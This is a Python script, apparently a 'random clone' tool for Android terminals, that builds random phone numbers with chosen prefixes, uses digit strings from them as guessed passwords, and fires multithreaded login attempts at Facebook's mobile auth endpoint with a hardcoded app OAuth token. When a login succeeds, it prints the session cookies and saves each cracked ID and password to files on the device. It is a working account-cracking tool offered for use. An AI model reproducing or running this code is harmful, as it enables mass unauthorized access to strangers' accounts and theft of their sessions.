import os
import sys 
import time 
import random
import string
from concurrent.futures import ThreadPoolExecutor as Tread
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import re 
import uuid
import json
#--------------------------رن-----------------------#
l="\033[1;90m"      # Black
r="\033[1;91m"        # Red
g="\033[1;92m"      # Green
y="\033[1;93m"     # Yellow
b="\033[1;94m"       # Blue
p="\033[1;95m"     # Purple
c="\033[1;96m"       # Cyan
w="\033[1;97m"      # White 
oks=[]
cps=[]
loop=0
#---------------------------داغ------------------------#
def linex():
    print(22*'\033[1;91m━━')
#--------------------------اسمي-----------------------#
def frhn(): 
    Username = "Farhan40"
    password = "farhan12"

    givenUsername = input("Enter your username: ")
    if givenUsername == Username:
        print("correct Username")
    givenPasswod = input("Enter your password: ")
    
    print("correct Password")
    
     
adib = f"""
{r}⫷ KING AYAN ⫸ 

              {r}╔════════════════════╗ 
              {g}┃\033[37;41mWELLCOME TO MY WORLD\033[0;m\033\033[1;32m{g}┃ 
              {r}╚════════════════════╝ 
"""
def usa():
        os.system("clear");time.sleep(1);print(adib);linex()
        frhn()
        print(f"{b}[{w}={b}]  {w}OWNNER    {y}: {c}KING AYAN") 
        print(f"{b}[{w}={b}]  {w}FB PAGE   {y}: {w}HELLO WORLD")
        print(f"{b}[{w}={b}]  {w}GITHUB    {y}: {w}KING{r}-{w}AYAN{r}-{w}7{r}0{w}7")
        print(f"{b}[{w}={b}]  {w}TOOLS     {y}: {w}F{c}/{w}R{c}/{w}G");linex()
#-------------------اصل---------------------#
def __KING_AYAN__(): 
        usa();linex();print(f"{b}[{w}01{b}] {w} RANDOM CLONE");print(f"{b}[{w}02{b}] {w} FOLLOW MY PAGE");print(f"{b}[{w}03{b}] {w} FOLLOW MY GITHUB ");print(f"{b}[{w}04{b}] {w} CONTACT WONNER");linex()
        ops=input(f" {y}[{b}={y}] {y}[{b}->{y}] {w}CHO{l}O{w}SSE {y}:{l} ")
        if ops in ['01','1']:
                UUID()
#-------------------عمل--------------------------#

def UUID():
        user=[]
        usa();linex();
        print(f"      {c}➣{g} ‣ {r}E{y}X{g}M {c}: {w}017{c}/{w}018{c}/{w}016{c}/{w}015 \n")
        cdx=input(f" {y}[{b}={y}] {y}[{b}->{y}] {w}CHO{l}O{w}SSE {y}:{l} ")
        print(f"\n      {c}➣{g} ‣ {r}E{y}X{g}M {c}: {w}1000{c}/{w}3000{c}/{w}5000{c}/{w}10000 \n")
        lmit=int(input(f" {y}[{b}={y}] {y}[{b}->{y}] {w}CHO{l}O{w}SSE {y}:{l} "))
        for nmbr in range(lmit):
                xx=''.join(random.choice(string.digits) for _ in range(8))
                user.append(xx)
        with tred(max_workers=30) as Khanki:
                tl=str(len(user))
                usa()
                print(f"{b}[{w}={b}]  {w}TOTAL IDSS       {y}:{y} "+tl)
                print(f"{b}[{w}={b}]  {w}YOUR SIM CODE    {y}:{g} "+cdx)
                print(f"{b}[{w}={b}]  {w}YOUR CRACK {c}ST{l}A{w}RTED{r}・{g}・{l}・")
                linex()
                for psx in user:
                        ids=cdx+psx
                        passlist=[psx,ids]
                        Khanki.submit(method_crack,ids,passlist)
        linex()
        print(f"{b}[{w}={b}]  {w}YOUR CRACK COMPLETE {r}・{c} ・{l} ・{g} ・ ")
#------------------------مطد-----------------------#
def method_crack(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
                milejan=random.choice([l,r,g,y,c,b,y,w])
                sys.stdout.write(f'\r\r {w}[{milejan}ADIB-NOOB{w}]{y}<><>{g}[{milejan}%s{g}]{y}<><>{c}[{w}DONE{c}]{y}<><{g}[%s{g}]'%(loop,len(oks)))
                sys.stdout.flush()
                adid=str(uuid.uuid4())
                device_id=str(uuid.uuid4())
                datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
                header={'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
                url='https://api.facebook.com/method/auth.login'
                adiibx=requests.post(url,data=datax,headers=header).json()
                if 'session_key' in adiibx:
                    try:
                        uid=reqx['uid']
                    except:
                        uid=ids
                    if str(uid) in oks:
                        break
                    else:
                        print(f'\r\r {g}[🌹]ADIB-OKK= '+str(uid)+'・'+pas+'\n')
                        coki=";".join(i["name"]+"="+i["value"] for i in adiibx["session_cookies"])
                        print(f'\033[1;32m {w}COOKIES={y} '+coki)
                        open('/sdcard/ADIB-OKK.txt','a').write(str(uid)+' | '+pas+'\n')
                        oks.append(str(uid))
                        break
                elif 'www.facebook.com' in adiibx['error_msg']:
                    print(f'\r\r {l}[😈]ADIB-FAIL= '+ids+'・'+pas)
                    open('/sdcard/ADIB-FAIL.txt','a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:
                    continue 
        loop+=1
    except:
            pass

#------------------انتها العمل----------------------#
if __name__ in "__main__":
        __KING_AYAN__() 

